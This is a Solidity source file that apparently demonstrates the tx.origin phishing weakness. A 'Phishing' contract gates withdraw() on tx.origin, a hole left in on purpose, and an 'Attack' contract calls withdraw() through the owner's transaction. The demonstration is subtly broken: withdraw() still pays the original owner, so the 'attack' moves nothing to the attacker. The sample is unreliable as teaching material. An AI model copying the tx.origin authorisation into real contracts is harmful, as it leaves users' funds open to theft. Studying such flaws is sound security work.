// SPDX-License-Identifier: MIT

pragma solidity ^0.8.13;


contract Phishing
{

  // A->B->C (AT C msg.sender == B) (AT C tx.origin == A)

  address public owner ;

  constructor()
  {
     owner = msg.sender;
  }
  
  function deposit() public payable
  {

  }

  function withdraw() public
  {
      require(tx.origin == owner ,"Only owner can withdraw");
      (bool result,) = payable(owner).call{value :  getbalance()}("");
      require(result,"Ether not sent succesfully");
  }

  function getbalance() public view returns(uint256)
  {
      return address(this).balance;
  }


}


contract Attack 
{
    Phishing public phishing;
    address public owner ;

    constructor(address _phishing)
    {
       phishing =  Phishing(_phishing);
       owner = msg.sender;
    }

    function attack() public 
    {
        phishing.withdraw();
    }


   function getbalance() public view returns(uint256)
   {
       return address(this).balance;
   }



}
